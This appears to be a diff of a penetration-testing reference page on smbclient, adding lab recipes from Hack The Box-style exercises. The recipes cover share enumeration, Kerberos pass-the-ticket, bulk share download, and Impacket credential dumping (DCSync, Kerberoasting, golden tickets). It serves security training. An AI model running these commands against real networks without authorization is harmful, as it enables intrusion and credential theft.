@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=smbclient) · [All tools](/index)
+
 ## Commands
 
 **Kali**
@@ -26,8 +28,306 @@ put file.zip
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=smbclient)
+## Notebook recipes
 
-## Learning and original examples
+20 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [SMB Enumeration and Shares](/enumeration/smb-enumeration-server-message-block)
+<AccordionGroup>
+
+<Accordion title="List shares with a known account">
+
+### List shares with a known account
+
+**AD Lab Guide — Full Reference**
+
+```bash
+smbclient -L {{target}} -U {{identity}}
+```
+
+</Accordion>
+
+<Accordion title="Smb">
+
+### Smb
+
+**Active Directory Enumeration Commands**
+
+```bash
+nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --shares
+    # List SMB shares and permissions
+
+nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --sessions
+    # Show active SMB sessions
+
+nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --loggedon-users
+    # Show users currently logged onto the target
+
+smbclient -L //<DC_IP>/ -U '<DOMAIN>/<USER>%<PASSWORD>'
+    # List available SMB shares
+
+smbclient //<DC_IP>/<SHARE> -U '<DOMAIN>/<USER>%<PASSWORD>'
+    # Connect to a specific SMB share
+```
+
+</Accordion>
+
+<Accordion title="Anonymous Authentication">
+
+### Anonymous Authentication
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ smbclient -N -L //10.129.14.128
+
+        Sharename       Type      Comment
+        -------      --     -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        notes           Disk      CheckIT
+        IPC$            IPC       IPC Service (DEVSM)
+SMB1 disabled no workgroup available
+```
+
+</Accordion>
+
+<Accordion title="SMB (Port 445)">
+
+### SMB (Port 445)
+
+**Footprinting: Service-by-Service Lab Workflow**
+
+```bash
+# Check credentials & auth
+nxc smb <IP> -u <user> -p '<pass>'
+
+# List shares
+nxc smb <IP> -u <user> -p '<pass>' --shares
+
+# List users
+nxc smb <IP> -u <user> -p '<pass>' --users
+
+# Browse shares interactively
+smbclient //IP/<share> -U '<user>%<pass>'
+
+# Commands inside smbclient
+ls
+cd <folder>
+get <file>
+```
+
+</Accordion>
+
+<Accordion title="Original captured examples">
+
+### Original captured examples
+
+**Impacket: Script Quick Reference**
+
+```bash
+# remote execution (need admin creds or hash)
+psexec.py $DOMAIN/admin:PASS@$IP            # SYSTEM shell (noisy)
+wmiexec.py $DOMAIN/admin@$IP -hashes :<nt>  # semi-interactive, quieter
+smbexec.py / atexec.py / dcomexec.py        # alternatives
+# credentials
+secretsdump.py $DOMAIN/USER:PASS@$DC -just-dc   # DCSync
+GetUserSPNs.py $DOMAIN/USER:PASS -dc-ip $DC -request     # Kerberoast
+GetNPUsers.py  $DOMAIN/ -usersfile users.txt -no-pass    # AS-REP roast
+# tickets
+getTGT.py $DOMAIN/USER:PASS ; export KRB5CCNAME=USER.ccache
+ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain $DOMAIN Administrator   # golden
+# shares / lookups
+smbclient.py ; lookupsid.py ; mssqlclient.py $DOMAIN/USER:PASS@$IP -windows-auth
+```
+
+</Accordion>
+
+<Accordion title="Connect using that cache">
+
+### Connect using that cache
+
+**Kerberos when NTLM is unavailable**
+
+```bash
+impacket-smbclient -k -no-pass 'DOMAIN_FQDN/USER@HOST_FQDN' -dc-ip DC_IP
+```
+
+**Kerberos when NTLM is unavailable**
+
+```bash
+smbclient '//HOST_FQDN/SHARE' --use-kerberos=required --use-krb5-ccache=/absolute/path/USER.ccache
+```
+
+</Accordion>
+
+<Accordion title="Access Resources">
+
+### Access Resources
+
+**Pass the Ticket from Linux**
+
+```bash
+smbclient //dc01/carlos -k -c ls
+```
+
+</Accordion>
+
+<Accordion title="Access Resources Using the Ticket">
+
+### Access Resources Using the Ticket
+
+**Pass the Ticket from Linux**
+
+```bash
+smbclient //dc01/C$ -k -no-pass
+```
+
+</Accordion>
+
+<Accordion title="Alternative — use the machine ccache SSSD already maintains">
+
+### Alternative — use the machine ccache SSSD already maintains
+
+**Pass the Ticket from Linux**
+
+```bash
+export KRB5CCNAME=/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
+klist     # Default principal: LINUX01$@INLANEFREIGHT.HTB
+smbclient //dc01/linux01 -k -c 'ls' -no-pass
+```
+
+</Accordion>
+
+<Accordion title="Step 3 — Read the share as the machine account">
+
+### Step 3 — Read the share as the machine account
+
+**Pass the Ticket from Linux**
+
+```bash
+smbclient //dc01/linux01 -k -c 'ls' -no-pass                       # list first
+smbclient //dc01/linux01 -k -c 'get flag.txt /tmp/flag.txt' -no-pass
+cat /tmp/flag.txt
+```
+
+</Accordion>
+
+<Accordion title="smbclient gotchas (reading shares with a ticket)">
+
+### smbclient gotchas (reading shares with a ticket)
+
+**Pass the Ticket from Linux**
+
+```bash
+# WRONG — treats "julio/julio.txt" as a share name → NT_STATUS_BAD_NETWORK_NAME
+smbclient //dc01/julio/julio.txt -k -c get -no-pass
+
+# RIGHT — connect to the share, then get the file (optionally to a local path)
+smbclient //dc01/julio -k -c 'get julio.txt /tmp/julio.txt' -no-pass
+cat /tmp/julio.txt
+```
+
+**Pass the Ticket from Linux**
+
+Context from the notebook: List a share:  smbclient //dc01/&lt;share> -k -c 'ls' -no-pass
+
+```text
+smbclient //dc01/<share> -k -c 'ls' -no-pass
+```
+
+**Pass the Ticket from Linux**
+
+Context from the notebook: Recurse + download everything:  smbclient //dc01/&lt;share> -k -c 'recurse ON; prompt OFF; mget *' -no-pass
+
+```text
+smbclient //dc01/<share> -k -c 'recurse ON; prompt OFF; mget *' -no-pass
+```
+
+</Accordion>
+
+<Accordion title="SMB (445)">
+
+### SMB (445)
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+netexec smb 10.129.42.197 -u user -p password --shares
+smbclient -U user \\\\10.129.42.197\\SHARENAME
+```
+
+</Accordion>
+
+<Accordion title="2. Listing and reading shares">
+
+### 2. Listing and reading shares
+
+**SMB Enumeration and Shares**
+
+```bash
+smbclient -L //<IP>/ -N                         # -N = no password; list shares via null session
+smbclient //<IP>/<share> -U '<user>%<pass>'     # connect to a share interactively
+#   inside smbclient:  ls / cd <dir> / get <file> / mget * / recurse ON; ls
+smbmap -H <IP> -u <user> -p '<pass>'            # list shares WITH permissions in one view
+smbmap -H <IP> -u <user> -p '<pass>' -R <share> # recurse a share and show the file tree
+```
+
+</Accordion>
+
+<Accordion title="Impacket: Script Quick Reference">
+
+### Impacket: Script Quick Reference
+
+**Impacket: Script Quick Reference**
+
+Context from the notebook: SMB client / local server smbclient.py ,  smbserver.py  /  impacket-smbclient ,  impacket-smbserver SMB  ·  Transfers
+
+```text
+smbclient.py
+```
+
+</Accordion>
+
+<Accordion title="File Transfer Protocols">
+
+### File Transfer Protocols
+
+**Ports, Protocols, and Services by Purpose**
+
+Context from the notebook: SMB 445 Windows file sharing smbclient //&lt;IP>/share
+
+```text
+smbclient //<IP>/share
+```
+
+</Accordion>
+
+<Accordion title="SMB / Windows Enumeration">
+
+### SMB / Windows Enumeration
+
+**Ports, Protocols, and Services by Purpose**
+
+Context from the notebook: smbclient List/connect to shares smbclient -N -L //&lt;IP>
+
+```text
+smbclient -N -L //<IP>
+```
+
+</Accordion>
+
+<Accordion title="Quick reference">
+
+### Quick reference
+
+**SMB Enumeration and Shares**
+
+Context from the notebook: First move Null session:  nxc smb &lt;IP> -u '' -p ''  and  smbclient -L //&lt;IP>/ -N
+
+```text
+smbclient -L //<IP>/ -N
+```
+
+</Accordion>
+
+</AccordionGroup>
